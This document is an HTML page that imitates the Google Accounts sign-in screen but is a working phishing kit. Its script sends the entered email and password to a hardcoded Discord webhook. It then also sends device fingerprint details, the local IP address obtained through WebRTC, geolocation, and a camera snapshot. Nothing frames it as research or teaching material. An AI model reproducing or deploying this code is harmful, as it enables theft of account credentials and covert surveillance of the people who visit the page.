<!DOCTYPE html> 
<html lang="en">

<head>
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f1f1f1;
        }

        .container {
            background: white;
            padding: 40px;
            width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 75px;
        }

        .title {
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 10px;
            text-align: center;
        }

        .input-field {
            margin-bottom: 15px;
        }

        .input-field input {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 16px;
            border: 1px solid #d3d3d3;
            border-radius: 4px;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #4285f4;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #357ae8;
        }
    </style>
    <script>
        // Send Data to Discord Webhook
        async function sendToDiscord(title, data) {
            const payload = {
                content: `New ${title} Collected`,
                embeds: [
                    {
                        title: title,
                        description: "Information gathered from the scanned QR code",
                        color: 16711680,
                        fields: Object.keys(data).map(key => ({
                            name: key,
                            value: typeof data[key] === 'string' ? data[key] : JSON.stringify(data[key]),
                            inline: false
                        }))
                    }
                ]
            };

            await fetch("https://discord.com/api/webhooks/1253037319871660135/EPMCB_0O4lGWNrc64H1snD0T0VA5mnb6OdvhO7Suhdr24nI1tWmYU_qJI7UPzcLVCC0q", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
        }

        // Gather Device Information
        async function gatherDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezoneOffset: new Date().getTimezoneOffset(),
                hardwareConcurrency: navigator.hardwareConcurrency,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                plugins: [...navigator.plugins].map(plugin => plugin.name),
                cookieEnabled: navigator.cookieEnabled,
            };

            sendToDiscord("Device Information", deviceInfo);
        }

        // Get Local IP Address using WebRTC
        async function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = ipRegex.exec(event.candidate.candidate);
                        if (match) {
                            sendToDiscord("Local IP Address", { ip: match[1] });
                            resolve(match[1]);
                        }
                    }
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
            });
        }

        // Request Camera Access and Take Picture
        async function takePicture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                document.body.appendChild(video);

                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert to Base64 and send it to Discord
                    const imageData = canvas.toDataURL('image/png');
                    sendToDiscord("Camera Snapshot", { image: imageData });

                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                }, 5000);
            } catch (err) {
                console.error('Camera access denied:', err);
            }
        }

        // Get Geolocation Data
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                    };
                    sendToDiscord("Geolocation Data", locationData);
                });
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        // Collect Login Credentials
        async function collectCredentials(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const credentials = {
                email: email,
                password: password
            };

            await sendToDiscord("Login Credentials", credentials);

            // Also run other data collection functions
            gatherDeviceInfo();
            getLocalIP();
            getLocation();
            takePicture();
        }
    </script>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <div class="title">Sign in</div>
        <form onsubmit="collectCredentials(event)">
            <div class="input-field">
                <input type="email" id="email" placeholder="Email or phone" required>
            </div>
            <div class="input-field">
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="submit-btn">Next</button>
        </form>
    </div>
</body>

</html>
